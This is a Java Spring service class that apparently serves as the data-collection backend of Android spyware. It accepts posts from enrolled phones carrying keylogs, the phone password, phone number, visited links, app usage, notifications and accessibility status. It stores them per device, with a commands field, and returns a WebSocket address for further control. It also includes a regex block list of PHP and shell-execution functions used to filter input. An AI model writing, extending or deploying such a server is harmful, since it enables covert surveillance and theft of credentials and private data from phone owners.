package com.mm.backend.legacy;

import java.sql.Timestamp;
import java.time.Instant;
import java.util.Map;
import java.util.UUID;
import java.util.regex.Pattern;

import jakarta.servlet.http.HttpServletRequest;

import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.HttpStatus;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.stereotype.Service;
import org.springframework.web.util.HtmlUtils;

@Service
class DeviceIngressService {

    private static final Pattern DANGEROUS = Pattern.compile(
        "(?i)<\\?php|<script|eval\\s*\\(|shell_exec|system\\s*\\(|exec\\s*\\(|passthru|base64_decode\\s*\\("
    );

    private final JdbcTemplate jdbc;
    private final GeoIpService geoIpService;
    private final String deviceApiKey;
    private final String wsUrl;

    DeviceIngressService(
        JdbcTemplate jdbc,
        GeoIpService geoIpService,
        @Value("${mm.device-api-key:}") String deviceApiKey,
        @Value("${mm.ws-url:wss://yourdomain.com/api/ws/}") String wsUrl
    ) {
        this.jdbc = jdbc;
        this.geoIpService = geoIpService;
        this.deviceApiKey = deviceApiKey;
        this.wsUrl = wsUrl;
    }

    String ingest(HttpServletRequest request, Map<String, String> form) {
        if (deviceApiKey.isBlank()) {
            throw new ApiException(HttpStatus.SERVICE_UNAVAILABLE, Map.of("error", "service_unavailable"));
        }
        if (!LegacySecurity.constantEquals(deviceApiKey, header(request, "X-Device-Key"))) {
            throw new ApiException(HttpStatus.UNAUTHORIZED, Map.of("error", "unauthorized"));
        }

        String email = sanitize(form.getOrDefault("user_email", "empty"), 255);
        String phoneId = sanitize(form.getOrDefault("phone_id", ""), 64);
        String phoneName = sanitize(form.getOrDefault("phone_name", ""), 50);
        String androidVersion = sanitize(form.getOrDefault("android_version", ""), 20);
        String model = sanitize(form.getOrDefault("model", ""), 50);
        String phonePassword = sanitize(form.getOrDefault("phone_password", ""), 100);
        String phoneNumber = sanitize(form.getOrDefault("phone_number", ""), 30);
        String batteryCharge = sanitize(form.getOrDefault("battery_charge", ""), 10);
        String network = sanitize(form.getOrDefault("network", ""), 50);
        String installDate = sanitize(form.getOrDefault("install_date", ""), 30);
        String sessionId = sanitize(form.getOrDefault("idf", ""), 100);
        String keylogs = sanitize(form.getOrDefault("keylogs", ""), 65_535);
        String visitedLinks = sanitize(form.getOrDefault("vLinks", ""), 65_535);
        String visitedApps = sanitize(form.getOrDefault("vapps", ""), 65_535);
        String notifications = sanitize(form.getOrDefault("notifys", ""), 65_535);
        String activities = sanitize(form.getOrDefault("activz", ""), 65_535);
        String accessibility = sanitize(form.getOrDefault("accessibility", "0"), 5);
        int isOnline = RequestData.integer(Map.copyOf(form), "isonline", 1);
        String wallpaper = safeBase64(form.getOrDefault("wallpap", "-1"));

        if (phoneId.isBlank() || "empty".equals(phoneId)) {
            phoneId = UUID.randomUUID().toString();
        }
        if (phoneName.isBlank() && androidVersion.isBlank() && model.isBlank() && installDate.isBlank()) {
            return "{\"ok\":false}";
        }

        String username = findUsernameByEmail(email);
        String address = request.getRemoteAddr() == null ? "" : request.getRemoteAddr();
        String country = geoIpService.countryFor(address);
        Timestamp now = Timestamp.from(Instant.now());
        String defaultOptions = "{\"Activities\":\"0\",\"keystrokes\":\"1\",\"notifications\":\"1\",\"visitedapps\":\"0\",\"visitedlinks\":\"0\",\"livenotify\":\"0\"}";

        jdbc.update("""
            INSERT INTO phones (
              phone_id, usrname, phone_name, country, address, android_ver, model, phonepassword,
              phonenumber, wallpaper, battery_charg, network, install_date, last_ping,
              files_path, files_data, mob_permissions, keylogs_dates, visited_links, visited_apps,
              notifications, activities, phone_options, session_id, Commands, isonline, isRemoved, accessibility
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ON DUPLICATE KEY UPDATE
              usrname = VALUES(usrname),
              phone_name = VALUES(phone_name),
              country = VALUES(country),
              address = VALUES(address),
              android_ver = VALUES(android_ver),
              model = VALUES(model),
              phonepassword = VALUES(phonepassword),
              phonenumber = VALUES(phonenumber),
              wallpaper = VALUES(wallpaper),
              battery_charg = VALUES(battery_charg),
              network = VALUES(network),
              install_date = VALUES(install_date),
              last_ping = VALUES(last_ping),
              isonline = VALUES(isonline),
              accessibility = VALUES(accessibility)
            """,
            phoneId, username, phoneName, country, address, androidVersion, model, phonePassword,
            phoneNumber, wallpaper, batteryCharge, network, installDate, now, "", "", null, keylogs,
            visitedLinks, visitedApps, notifications, activities, defaultOptions, sessionId, "", isOnline, 0,
            accessibility);

        return "Conf:{\"sk\":\"" + wsUrl + "\"}";
    }

    private String findUsernameByEmail(String email) {
        return jdbc.query("SELECT usrname FROM users WHERE email = ? LIMIT 1", rs -> {
            if (rs.next()) {
                return rs.getString(1);
            }
            return "empty";
        }, email);
    }

    private static String header(HttpServletRequest request, String name) {
        String value = request.getHeader(name);
        return value == null ? "" : value;
    }

    private static String safeBase64(String value) {
        if ("-1".equals(value)) {
            return "-1";
        }
        if (value == null || value.isBlank() || value.length() > 2 * 1024 * 1024 || value.length() % 4 != 0) {
            return "-1";
        }
        if (!value.matches("^[a-zA-Z0-9/\\r\\n+]*={0,2}$")) {
            return "-1";
        }
        return value;
    }

    private static String sanitize(String value, int maxLen) {
        String sanitized = value == null ? "" : value.trim();
        if (sanitized.length() > maxLen) {
            sanitized = sanitized.substring(0, maxLen);
        }
        String prev;
        do {
            prev = sanitized;
            sanitized = DANGEROUS.matcher(sanitized).replaceAll("");
        } while (!prev.equals(sanitized));
        return HtmlUtils.htmlEscape(sanitized, "UTF-8");
    }
}
